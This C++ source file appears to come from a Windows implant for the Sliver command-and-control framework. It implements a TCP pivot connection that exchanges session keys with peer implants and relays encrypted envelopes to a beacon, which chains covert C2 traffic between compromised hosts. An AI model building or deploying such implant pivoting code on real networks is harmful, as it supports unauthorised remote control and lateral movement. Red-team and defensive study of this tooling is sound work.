#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "PivotConn.h"
#include "CryptoUtils.h"
#include "sliver.pb.h"
#include "constants.h"
#include "pivots.h"
extern string instanceID;

namespace pivots {
	TCPConn::TCPConn(SOCKET _client_socket) : client_socket(_client_socket) {
	}
	bool TCPConn::Check() {
		return true;
	}
	TCPConn::~TCPConn() {
		if (t.joinable())
			t.join();
	}
	void TCPConn::Stop() {
		this->stop = true;
		if (t.joinable())
			t.join();
		this->closed = true;
	}
	void TCPConn::Start() {
		std::thread t1{
			[&] {
				while (1) {
					if (stop) {
						closesocket(this->client_socket);
						return;
					}
					try {
						string error = "";
						auto env = ReadEnvelope(error);
						if (error != "") {
#ifdef DEBUG
							cout << error << endl;
#endif
							stop = true;
							continue;
						}
						if (env.type() == sliverpb::MsgPivotPeerEnvelope || env.type() == sliverpb::MsgPivotPeerEnvelopeNoResponse) {
							sliverpb::PivotPeerEnvelope peer_env;
							peer_env.ParseFromString(env.data());
							auto peers = peer_env.peers();
							for (auto it = peers.begin();it != peers.end();++it) {
								auto a = it->peerid();
							}
							auto p = peer_env.add_peers();
							auto temp = instanceID;
							temp.resize(8);
							p->set_name(temp);
							p->set_peerid(pivots::getPeerID());
							for (auto it = peers.begin();it != peers.end();++it) {
								auto a = it->peerid();
							}
							string serialized;
							peer_env.SerializeToString(&serialized);
							env.set_data(serialized);
							sliverpb::Envelope resp;
							if (env.type() == sliverpb::MsgPivotPeerEnvelope) {
								if (beacon->BeaconRecv(env, resp)) {
									string error = "";
									if (!WriteEnvelope(resp, error)) {
#ifdef DEBUG
										cout << error << endl;
#endif
										stop = true;
										continue;
									}
								}
								else {
#ifdef DEBUG
									cout << "BeaconRecv returned false" << endl;
#endif
									stop = true;
									continue;
								}
							}
							else if (env.type() == sliverpb::MsgPivotPeerEnvelopeNoResponse) {
								if (!beacon->BeaconSend(env)) {
#ifdef DEBUG
									cout << "BeaconSend returned false" << endl;
#endif
									stop = true;
									continue;
								}
							}
						}
					}
					catch(exception &e){
						cout << std::format("TCPConn Conn catched exception: {}", e.what()) << endl;
						stop = true;
					}
				}
			} 
		};
		this->t = std::move(t1);
	}
	sliverpb::Envelope TCPConn::ReadEnvelope(string& error) {
		auto data = read(error);
		if (error != "")
			return sliverpb::Envelope{};
		auto plain = ctx.Decrypt(data);
		sliverpb::Envelope env;
		env.ParseFromString(plain);
		return env;
	}

	bool TCPConn::WriteEnvelope(const sliverpb::Envelope& env, string& error) {
		string serialized;
		env.SerializeToString(&serialized);
		auto enc = this->ctx.Encrypt(serialized);
		return this->write(enc,error);
	}

	string TCPConn::read(string& error) {
		int res = 0;
		fd_set fds;
		FD_ZERO(&fds);
		FD_SET(this->client_socket, &fds);
		auto ret = select(0, &fds, NULL, &fds, NULL);
		if (ret) {
			SIZE_T len = 0;
			res = recv(this->client_socket, (char*)&len, sizeof(SIZE_T), 0);
			if (res == 0 || res == SOCKET_ERROR) {
				error = std::format("recv failed with error {}",GetLastError());
				return "";
			}
			std::string out;
			out.resize(len);
			res = recv(this->client_socket, (char*)out.c_str(), len, 0);
			if (res == 0 || res == SOCKET_ERROR) {
				error = std::format("recv failed with error {}",GetLastError());
				return "";
			}
			return out;
		}
		error = std::format("select failed with error {}",GetLastError());
		return "";
	}

	bool TCPConn::write(const string& in, string& error) {
		DWORD written = 0;
		fd_set fds;
		FD_ZERO(&fds);
		FD_SET(this->client_socket, &fds);
		auto ret = select(0, NULL, &fds, &fds, NULL);
		if (ret) {
			SIZE_T len = in.size();
			written = send(this->client_socket, (char*)&len, sizeof len, 0);
			if (written != sizeof len) {
				error = std::format("send failed with error {}", GetLastError());
				return false;
			}
			written = send(this->client_socket, (char*)in.c_str(), len, 0);
			if (written != len) {
				error = std::format("send failed with error {}", GetLastError());
				return false;
			}

			return true;
		}
		error = std::format("select failed with error {}",GetLastError());
		return false;
	}
	bool TCPConn::peerKeyExchange() {
		string error = "";
		auto s = this->read(error);
		if (error != "")
			return false;
		sliverpb::PivotHello hello;
		hello.ParseFromString(s);
		this->downstreamPeerID = hello.peerid();
		auto key = crypto::RandomKey();
		this->ctx.SetKey(key);
		sliverpb::PivotHello resp;
		resp.set_sessionkey(key);
		string serialized_resp;
		resp.SerializeToString(&serialized_resp);
		return this->write(serialized_resp,error);
	}
}